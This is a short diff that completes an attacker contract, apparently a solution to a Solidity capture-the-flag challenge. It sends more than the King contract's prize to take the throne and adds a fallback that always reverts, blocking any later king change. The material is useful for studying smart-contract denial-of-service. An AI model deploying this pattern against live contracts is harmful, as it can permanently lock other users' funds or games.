@@ -10,7 +10,16 @@ contract AttackingKing {
         contractAddress = _contractAddress;
     }
 
+    // need to prevent execution of setting the new king on the contract
+    // value must be greater than the current king's prize
     function hackContract() external {
-        // Code me!
+        (bool success, ) = contractAddress.call{value: King(payable(contractAddress))._prize() + 10}("");
+        
+        require(success, "Failed to send new prize");
+    }
+
+    //  Error: Transaction reverted: function selector was not recognized and there's no fallback nor receive function
+    fallback() external payable {
+        revert("Transfer didn't work");
     }
 }
